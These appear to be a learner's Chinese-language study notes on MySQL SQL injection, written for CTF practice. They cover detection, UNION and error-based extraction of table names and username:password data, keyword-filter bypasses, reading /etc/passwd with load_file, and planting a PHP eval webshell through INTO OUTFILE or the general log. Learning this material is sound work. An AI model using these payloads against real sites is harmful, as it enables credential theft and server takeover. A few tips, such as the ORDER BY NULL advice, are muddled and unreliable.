# 第三天：SQL注入

## 核心概念

今天学的是SQL注入（SQL Injection），说实话这算是Web安全里最经典的一个漏洞了，虽然现在各种框架都有预编译防护，但在CTF和一些老系统里还是经常能碰到。

SQL注入的本质说白了就是：攻击者找到了一个可以植入数据的地方（比如登录框、URL参数、搜索框），然后往里面塞了一段精心构造的SQL代码。后端拿到这个输入之后没有做任何处理，直接拼到了SQL语句里发给数据库执行。等于是数据库把攻击者的输入当成了SQL指令的一部分来跑了，这就是注入。

举个例子，假如后端代码是这么写的：

```sql
SELECT * FROM users WHERE username = '$input';
```

正常情况下用户输入 `zhangsan`，拼出来的语句是：

```sql
SELECT * FROM users WHERE username = 'zhangsan';
```

但如果攻击者输入 `' OR 1=1 -- `，拼出来的就变成了：

```sql
SELECT * FROM users WHERE username = '' OR 1=1 -- ';
```

单引号提前闭合了字符串，`OR 1=1` 让条件永远为真，`-- ` 把后面的东西全注释掉了。这条语句一执行，直接把所有用户都查出来了。

---

## 一、SQL注入的基础知识

### MySQL的系统表

今天主要讲的是MySQL环境下的SQL注入。MySQL里有一些系统自带的信息表特别关键，是注入的时候获取数据库结构的主要途径。

最重要的就是 **information_schema** 这个数据库。它里面存的是整个MySQL实例的元数据，就是"关于数据库的数据库"。做SQL注入的时候主要用到它下面的三张表：

- **information_schema.schemata** — 存了所有数据库的名字，`schema_name` 字段就是数据库名。
- **information_schema.tables** — 存了所有表的信息，`table_schema` 字段表示这个表属于哪个数据库，`table_name` 是表名。
- **information_schema.columns** — 存了所有列的信息，`table_schema` 是所属数据库，`table_name` 是所属表，`column_name` 是列名。

注入流程里从"不知道任何数据库名"到"拿到具体数据"，就是靠这三张表一层层往下查的：先查 schemata 拿库名，再查 tables 拿表名，然后查 columns 拿列名，最后从目标表里取数据。

### 注入是怎么发生的

前面已经说了核心原因：后端直接把用户输入拼接到SQL语句里。具体来说有几个常见的导致注入的点：

- GET/POST 参数直接拼 SQL
- Cookie、HTTP Header（比如 User-Agent、Referer）拼 SQL
- 搜索框、排序参数、分页参数等

从代码层面看，后端可能是这样写的（PHP为例）：

```php
$id = $_GET['id'];
$sql = "SELECT * FROM news WHERE id = $id";
$result = mysql_query($sql);
```

或者带引号的：

```php
$name = $_GET['name'];
$sql = "SELECT * FROM users WHERE name = '$name'";
```

不管有没有引号包住，只要没有做参数化查询或者转义，就存在注入的可能。

---

## 二、如何发现SQL注入

### 最简单的：看报错信息

说实话，有些网站在开发阶段开了调试模式上线之后就忘了关，直接往参数里塞一个单引号，页面就爆出一大串数据库报错。这种是最容易判断的，基本一眼就能看出来有没有注入。

比如访问 `?id=1'`，页面直接返回：

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
```

这就明摆着告诉你有SQL注入，而且大概率是字符型注入（因为单引号导致了语法错误）。

### 判断字符型还是数字型

这是注入的第一步。字符型的意思就是参数在SQL里被引号包着，数字型就是不包引号。

一个很有用的技巧是用除法判断：

- **数字型**：输入 `1/1` 和 `1/0` 返回结果不同。`1/1` 正常返回，`1/0` 会因为除零而报错。
- **字符型**：`1/1` 和 `1/0` 返回一样，因为在字符型里 `1/1` 和 `1/0` 都是字符串，不会被执行成数学运算。

这个技巧在看不到报错信息的时候特别实用，比瞎猜闭合方式快多了。

### 通过闭合标签判断

确定了注入类型之后就要找到正确的闭合方式。常见的做法是先加一个单引号看回显变化，然后尝试不同的闭合：

- `'` — 单引号闭合
- `"` — 双引号闭合
- `')` — 带括号的单引号闭合
- `")` — 带括号的双引号闭合

如果报错信息还在，直接看报错内容就能猜出闭合方式。比如报错里出现 `near ''')'` 就说明是多了一个单引号加一个右括号，那闭合方式大概率是 `('`。

没有报错的情况下就只能根据页面回显的变化来猜了，这个是注入里最需要经验的环节。

---

## 三、常用的注入手法

### 联合注入（Union Injection）

联合注入是今天学的重点攻击方式，核心思路是用 `UNION SELECT` 把攻击者自己的查询结果附加到原始查询结果的后面，然后页面会把结果展示出来。

**第一步：判断字段数**

用 `ORDER BY` 一个一个试：

```
?id=1' ORDER BY 1 -- 
?id=1' ORDER BY 2 -- 
?id=1' ORDER BY 3 -- 
```

到哪个数字开始报错（或者回显有变化），字段数就是前面那个数字。比如 `ORDER BY 3` 报错了、`ORDER BY 2` 正常，说明有2个字段。

> 这里有个很重要的点：尽量用 `ORDER BY NULL` 的写法，比如 `ORDER BY 1` 改成 `SELECT NULL,NULL,...` 的方式来判断。因为如果用具体数字的话，可能会跟原始查询的字段类型冲突导致 UNION 失败，用 NULL 可以兼容任何类型。

还有一种方法是直接用 UNION SELECT 来试：

```
?id=1' UNION SELECT NULL -- 
?id=1' UNION SELECT NULL,NULL -- 
?id=1' UNION SELECT NULL,NULL,NULL -- 
```

同样，到哪个不报错了就是几个字段。

**第二步：判断回显位**

字段数知道了，接下来要找出哪些字段的结果会显示在页面上。把原始查询弄成空结果（比如 `id=-1` 或者 `id=1' and 1=2`），然后用 UNION SELECT 在各个位置上放不同的数字标记：

```
?id=-1' UNION SELECT 1,2,3 -- 
```

看看页面上哪些数字出现了，那些位置就是回显位。

**第三步：在回显位查数据**

在回显位上替换成要查的信息：

```
?id=-1' UNION SELECT 1,database(),3 -- 
```

这样就拿到了当前数据库名。然后依次查表名、列名、具体数据。

### 报错注入（Error-based Injection）

有些网站虽然不直接把查询结果显示出来，但是会把数据库的报错信息丢给你看。这时候可以用一些MySQL的特殊函数故意制造报错，让报错信息里带上我们要的数据。

常用的报错注入函数：

- **extractvalue(1, concat(0x7e, (查询语句)))** — XPATH报错注入，`0x7e` 是波浪号 `~`，用来防止特殊字符导致报错格式错乱。
- **updatexml(1, concat(0x7e, (查询语句)), 1)** — 同理，也是XPATH报错。

这两个函数的原理是：MySQL的XPATH解析器在解析非法XPATH表达式时会抛出错误，而错误信息里会包含那个"非法"的XPATH内容，也就等于把我们注入的查询结果带出来了。

用法示例：

```
?id=1' AND extractvalue(1, concat(0x7e, (SELECT database()))) -- 
```

页面可能会返回类似：

```
XPATH syntax error: '~security'
```

`security` 就是数据库名。

### 文件读取 — load_file()

如果MySQL的配置不够安全（`secure_file_priv` 为空或者没有限制），可以用 `load_file()` 函数读取服务器上的文件：

```sql
SELECT load_file('/etc/passwd');
```

在注入中这样用：

```
?id=-1' UNION SELECT 1,load_file('/etc/passwd'),3 -- 
```

这个函数能不能用取决于MySQL的 `secure_file_priv` 配置：
- 如果值为空 — 可以读任意文件
- 如果值为某个目录 — 只能读那个目录下的文件
- 如果值为 NULL — 完全禁用文件读写

### 文件写入 — INTO OUTFILE

同样，如果 `secure_file_priv` 配置不当，可以用 `SELECT ... INTO OUTFILE` 把查询结果写到服务器上的文件中：

```sql
SELECT '<?php eval($_POST["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

在注入中配合 UNION SELECT 使用：

```
?id=-1' UNION SELECT 1,'<?php eval($_POST["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php' -- 
```

这就直接写了一句话木马到网站目录下，后续就可以用蚁剑或者菜刀连接了。

### 日志写后门

还有一种更骚的操作：MySQL会把所有执行的SQL语句记录在日志里。如果你有权限修改 `general_log` 和 `general_log_file` 的配置，可以这样做：

1. 开启全局日志
2. 把日志文件路径改成网站目录下的一个 `.php` 文件
3. 执行一条包含PHP代码的查询

```sql
SET global general_log = 'ON';
SET global general_log_file = '/var/www/html/log.php';
SELECT '<?php eval($_POST["cmd"]); ?>';
```

这条 `SELECT` 语句会被记录到 `log.php` 里，访问这个文件就等于执行了PHP代码。

---

## 四、CTF实操流程

今天做了几道CTF的SQL注入题，虽然每道题的防护不一样，但注入的基本流程是差不多的，大概分这几步走：

### 第一步：判断注入类型和闭合方式

拿到题目先试单引号，看回显变化。有报错最好，直接就能判断；没报错就多试几种闭合。然后用除法判断是数字型还是字符型。

### 第二步：获取字段数

用 `ORDER BY N` 或者 `UNION SELECT NULL,...` 一路试到报错，确定查询有几个字段。

### 第三步：判断回显位

把原始查询结果置空，用 `UNION SELECT 1,2,3,...` 看哪里能显示出来。

### 第四步：查数据库名

在回显位上用 `database()` 函数：

```
?id=-1' UNION SELECT 1,database(),3 -- 
```

### 第五步：查表名

借助 information_schema.tables：

```
?id=-1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='security' -- 
```

多个表可以用 `group_concat()` 拼在一起：

```
?id=-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='security' -- 
```

### 第六步：查列名

知道了表名之后查列名：

```
?id=-1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema='security' AND table_name='users' -- 
```

### 第七步：拿数据

库名、表名、列名都知道了，直接查目标数据：

```
?id=-1' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM security.users -- 
```

`0x3a` 是冒号 `:`，用来分隔用户名和密码，方便看。

整个流程就是从 information_schema 里一层层往下挖掘：库名 → 表名 → 列名 → 数据。information_schema 这三张表（schemata、tables、columns）贯穿了整个注入过程，是SQL注入最核心的利用链路。

---

## 五、遇到的绕过手段

做题过程中也碰到了一些防护，不过都是比较基础的过滤，大概有这么几种情况：

### 关键字过滤

题目把 `or`、`and`、`where`、`select` 这些关键字过滤掉了。碰到这种情况有几个绕过思路：

**双写绕过**：如果过滤只做了一次替换（而且不忽略大小写或者替换后不递归检查），可以双写绕过。比如过滤掉了 `or`，那 `oorr` 被过滤掉中间的 `or` 之后又变成了 `or`：

```
?id=1' oorr 1=1 -- 
```

过滤后变成 `or 1=1`。

**大小写混写**：如果过滤区分大小写，直接用大小写混写就能绕过去：

```
?id=1' AnD 1=1 -- 
?id=1' UnIon SeLecT 1,2,3 -- 
```

但如果过滤不区分大小写（用 `strtolower` 之类的函数统一转小写再比较），这招就没用了。

### 预编译绕过

如果 `set` 没有被禁掉的话，可以用预编译语句绕过关键字过滤：

```sql
SET @sql = CONCAT('SEL','ECT * FROM users');
PREPARE stmt FROM @sql;
EXECUTE stmt;
```

不过这个在CTF里碰到的机会不多，一般是在那种过滤特别严、但又没禁 SET 的场景下用。

---

## 六、数据回显技巧

因为 UNION SELECT 一次只能在一个回显位上放一个字段的值，如果查出来的数据比较多，就要想办法把多条记录拼在一起展示。

### group_concat()

最常用的就是 `group_concat()`，它可以把多行结果拼接成一个字符串：

```sql
SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='security';
```

默认用逗号分隔，可以自定义分隔符：

```sql
SELECT group_concat(table_name SEPARATOR ' | ') FROM ...
```

或者在注入中用十六进制的分隔符：

```sql
?id=-1' UNION SELECT 1,group_concat(username,0x3a,password,0x3c,0x62,0x72,0x3e),3 FROM users -- 
```

这个 `0x3a` 是冒号，`0x3c,0x62,0x72,0x3e` 是 `<br>` 换行，方便在浏览器里看。

### concat()

`concat()` 只能拼同一行的多个字段，不能跨行合并：

```sql
SELECT concat(username, ':', password) FROM users;
```

### limit

还有一种思路是逐条查，用 `limit` 控制取哪一行：

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='security' LIMIT 0,1;
SELECT table_name FROM information_schema.tables WHERE table_schema='security' LIMIT 1,1;
SELECT table_name FROM information_schema.tables WHERE table_schema='security' LIMIT 2,1;
```

一条一条翻，虽然麻烦但是不受 `group_concat` 长度限制的影响（`group_concat` 默认最大长度是1024字节，超了会被截断）。

---

## 小结

今天的SQL注入内容量还是挺大的，上午讲原理和基础语法，下午主要就是做题。说实话SQL注入这个东西确实是"一看就会，一做就废"的类型——原理不复杂，但实际碰到题目的时候，闭合方式的判断、绕过技巧的选择、字段数的确认这些环节都需要动手试错才能积累感觉。

从整体来看，SQL注入的核心链条就是 information_schema 三张表的递进查询，掌握了这个思路就等于掌握了注入的主线。剩下的事情就是根据不同题目的防护措施灵活调整绕过方法。今天碰到的过滤都还算基础（关键字过滤、大小写不敏感之类的），后面的题目肯定会越来越难，但基本思路应该是通用的。
